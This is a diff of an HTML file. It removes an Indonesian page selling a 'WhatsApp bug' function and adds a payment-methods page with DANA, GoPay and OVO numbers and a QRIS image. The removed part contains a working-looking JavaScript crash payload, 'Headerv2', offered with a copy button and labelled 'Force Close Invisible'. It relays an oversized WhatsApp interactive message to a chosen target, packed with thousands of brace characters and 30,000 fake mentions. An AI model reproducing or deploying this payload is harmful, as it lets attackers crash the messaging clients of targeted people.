@@ -1,230 +1,107 @@
-<!DOCTYPE html>
-<html lang="id">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>☇ 𝐖𝐲͢𝐧𝐳̋`𝐬𝐗 𝟕𝟕𝟕</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <script>
-        tailwind.config = {
-            theme: {
-                extend: {
-                    colors: {
-                        'golden-gray': '#D4AF37',
-                        'dark-gold': '#996515',
-                        'soft-black': '#1a1a1a',
-                    }
-                }
-            }
-        }
-    </script>
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap');
-        
-        body {
-            font-family: 'Poppins', sans-serif;
-            background-color: #f5f5f5;
-        }
-        
-        .copy-btn {
-            transition: all 0.3s ease;
-        }
-        
-        .copy-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-        }
-        
-        .copy-btn.copied {
-            background-color: #10B981 !important;
-        }
-        
-        .word-item {
-            transition: all 0.2s ease;
-            border-left: 4px solid transparent;
-        }
-        
-        .word-item:hover {
-            transform: translateX(5px);
-            border-left-color: #D4AF37;
-        }
-        
-        .tooltip {
-            visibility: hidden;
-            opacity: 0;
-            transition: opacity 0.3s;
-        }
-        
-        .copy-btn:hover .tooltip {
-            visibility: visible;
-            opacity: 1;
-        }
-    </style>
-</head>
-<body class="bg-soft-black min-h-screen py-12 px-4 sm:px-6 lg:px-8">
-    <div class="max-w-3xl mx-auto">
-        <div class="text-center mb-10">
-            <h1 class="text-4xl font-bold text-golden-gray mb-2">☇ 𝐖𝐲͢𝐧𝐳̋`𝐬𝐗 𝟕𝟕𝟕</h1>
-            <p class="text-gray-300">Function Bug Whatsapp Exploitasi</p>
-        </div>
-        
-        <div class="bg-gray-900 rounded-xl shadow-2xl overflow-hidden">
-            <!-- Header -->
-            <div class="bg-gradient-to-r from-gray-800 to-gray-700 p-4 border-b border-golden-gray">
-                <h2 class="text-xl font-semibold text-white">DAFTAR FUNCTION</h2>
-                <p class="text-gray-300 text-sm">Pilih Function Disini</p>
-            </div>
-            
-            <!-- Word List -->
-            <div class="divide-y divide-gray-700">
-                <!-- Item 1 -->
-                <div class="word-item p-4 hover:bg-gray-800 group">
-                    <div class="flex justify-between items-center">
-                        <div>
-                            <p class="text-golden-gray font-medium">"async function Headerv2(target) {
-try {
-let message = {
-ephemeralMessage: {
-message: {
-interactiveMessage: {
-header: {
-title: "☇ 𝐖𝐲͢𝐧𝐳̋`𝐬𝐗 𝟕𝟕𝟕",
-hasMediaAttachment: false,
-locationMessage: {
-degreesLatitude: -6666666666,
-degreesLongitude: 6666666666,
-name: "",
-address: "",
-},
-},
-body: {
-text: "☇ 𝐖𝐲͢𝐧𝐳̋`𝐬𝐗 𝟕𝟕𝟕",
-},
-nativeFlowMessage: {
-messageParamsJson: "{".repeat(10000),
-},
-contextInfo: {
-participant: target,
-mentionedJid: [
-"0@s.whatsapp.net",
-...Array.from(
-{
-length: 30000,
-},
-() =>
-"1" +
-Math.floor(Math.random() * 5000000) +
-"@s.whatsapp.net"
-),
-],
-},
-},
-},
-},
-};
-
-await client.relayMessage(target, message, {
-messageId: null,
-participant: { jid: target },
-userJid: target,
-});
-} catch (err) {
-console.log(err);
-}
-}"</p>
-                            <p class="text-gray-400 text-sm mt-1">Force Close Invisible</p>
-                        </div>  
-                        <button class="copy-btn bg-golden-gray hover:bg-dark-gold text-soft-black font-medium py-2 px-4 rounded-lg relative" onclick="copyToClipboard(this, ''async function Headerv2(target) {
-try {
-let message = {
-ephemeralMessage: {
-message: {
-interactiveMessage: {
-header: {
-title: "☇ 𝐖𝐲͢𝐧𝐳̋`𝐬𝐗 𝟕𝟕𝟕",
-hasMediaAttachment: false,
-locationMessage: {
-degreesLatitude: -6666666666,
-degreesLongitude: 6666666666,
-name: "",
-address: "",
-},
-},
-body: {
-text: "☇ 𝐖𝐲͢𝐧𝐳̋`𝐬𝐗 𝟕𝟕𝟕",
-},
-nativeFlowMessage: {
-messageParamsJson: "{".repeat(10000),
-},
-contextInfo: {
-participant: target,
-mentionedJid: [
-"0@s.whatsapp.net",
-...Array.from(
-{
-length: 30000,
-},
-() =>
-"1" +
-Math.floor(Math.random() * 5000000) +
-"@s.whatsapp.net"
-),
-],
-},
-},
-},
-},
-};
-
-await client.relayMessage(target, message, {
-messageId: null,
-participant: { jid: target },
-userJid: target,
-});
-} catch (err) {
-console.log(err);
-}
-})">
-                            𝐂𝐎𝐏𝐘
-                            <span class="tooltip absolute -top-8 left-1/2 transform -translate-x-1/2 bg-gray-800 text-white text-xs px-2 py-1 rounded whitespace-nowrap">Klik untuk menyalin</span>
-                        </button>
-                    </div>
-                </div>
-            <!-- Footer -->
-            <div class="bg-gray-800 p-4 text-center border-t border-golden-gray">
-                <p class="text-gray-400 text-sm">Klik tombol "Salin" untuk menyalin teks ke clipboard</p>
-            </div>
-        </div>
-    </div>
-
-    <script>
-        function copyToClipboard(button, text) {
-            navigator.clipboard.writeText(text).then(() => {
-                // Change button style temporarily
-                const originalText = button.textContent.trim();
-                button.innerHTML = 'Tersalin!';
-                button.classList.add('copied');
-                
-                // Tooltip for copied state
-                const tooltip = button.querySelector('.tooltip');
-                if (tooltip) {
-                    tooltip.textContent = 'Teks berhasil disalin!';
-                }
-                
-                // Reset button after 2 seconds
-                setTimeout(() => {
-                    button.textContent = originalText;
-                    button.classList.remove('copied');
-                    if (tooltip) {
-                        tooltip.textContent = 'Klik untuk menyalin';
-                    }
-                }, 2000);
-            }).catch(err => {
-                console.error('Gagal menyalin teks: ', err);
-                alert('Gagal menyalin teks. Silakan coba lagi.');
-            });
-        }
-    </script>
-</body>
+<html lang="en">
+ <head>
+  <meta charset="utf-8"/>
+  <meta content="width=device-width, initial-scale=1" name="viewport"/>
+  <title>
+  Pembayaran 
+  </title>
+  <script src="https://cdn.tailwindcss.com">
+  </script>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+  <style>
+   @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap');
+    body {
+      font-family: 'Inter', sans-serif;
+    }
+  </style>
+ </head>
+ <body class="bg-gradient-to-b from-[#0a1229] to-[#0f183a] min-h-screen flex justify-center p-4">
+  <main class="max-w-md w-full bg-[#15203a] rounded-xl p-6 space-y-6">
+   <header class="text-center">
+    <h1 class="text-[#4db8ff] text-3xl font-extrabold">
+     Metode Pembayaran
+    </h1>
+    <p class="text-gray-400 mt-2">
+     Silakan pilih salah satu metode pembayaran di bawah ini.
+    </p>
+   </header>
+   <section class="space-y-6">
+    <!-- Dana -->
+    <article class="bg-[#1f2a47] rounded-lg p-4 space-y-2">
+     <div class="flex items-center space-x-2">
+      <h2 class="text-[#4db8ff] font-semibold text-lg">
+       DANA DIGITAL
+      </h2>
+      <span class="bg-[#1f6f4f] text-green-400 text-xs font-semibold rounded-md px-2 py-0.5">
+       ONLINE
+      </span>
+     </div>
+     <p class="text-white text-sm select-text">
+      082146399915
+     </p>
+     <button class="mt-2 inline-flex items-center space-x-2 bg-[#4db8ff] text-white text-sm font-semibold rounded-md px-3 py-1.5 hover:bg-[#3a9de0] transition" type="button">
+      <i class="far fa-clipboard">
+      </i>
+      <span>
+       COPY
+      </span>
+     </button>
+    </article>
+    <!-- Gopay -->
+    <article class="bg-[#1f2a47] rounded-lg p-4 space-y-2">
+     <div class="flex items-center space-x-2">
+      <h2 class="text-[#2ecc71] font-semibold text-lg">
+       GOPAY 
+      </h2>
+      <span class="bg-[#1f6f4f] text-green-400 text-xs font-semibold rounded-md px-2 py-0.5">
+       ONLINE
+      </span>
+     </div>
+     <p class="text-white text-sm select-text">
+      082262961033
+     </p>
+     <button class="mt-2 inline-flex items-center space-x-2 bg-[#2ecc71] text-white text-sm font-semibold rounded-md px-3 py-1.5 hover:bg-[#27ae60] transition" type="button">
+      <i class="far fa-clipboard">
+      </i>
+      <span>
+       COPY
+      </span>
+     </button>
+    </article>
+    <!-- OVO -->
+    <article class="bg-[#1f2a47] rounded-lg p-4 space-y-2">
+     <div class="flex items-center space-x-2">
+      <h2 class="text-[#b57aff] font-semibold text-lg">
+       OVO
+      </h2>
+      <span class="bg-[#1f6f4f] text-green-400 text-xs font-semibold rounded-md px-2 py-0.5">
+      082146399915
+      </span>
+     </div>
+     <p class="text-white text-sm uppercase select-text">
+     ONLINE
+     </p>
+     <button class="mt-2 inline-flex items-center space-x-2 bg-[#b57aff] text-white text-sm font-semibold rounded-md px-3 py-1.5 hover:bg-[#9a5fff] transition" type="button">
+      <i class="far fa-clipboard">
+      </i>
+      <span>
+       COPY
+      </span>
+     </button>
+    </article>
+    <!-- QRIS -->
+    <article class="bg-[#1f2a47] rounded-lg p-4 space-y-4">
+     <div class="flex items-center space-x-2">
+      <h2 class="text-[#b7e22f] font-semibold text-lg">
+       QRIS PAYMENT
+      </h2>
+      <span class="bg-[#1f6f4f] text-green-400 text-xs font-semibold rounded-md px-2 py-0.5">
+       ONLINE
+      </span>
+     </div>
+     <img alt="QRIS payment method illustration with a character with purple hair and a purple flower hairpin" class="mx-auto rounded-md" height="150" src="https://files.catbox.moe/t8aaid.jpg" width="150"/>
+    </article>
+   </section>
+  </main>
+ </body>
 </html>
-
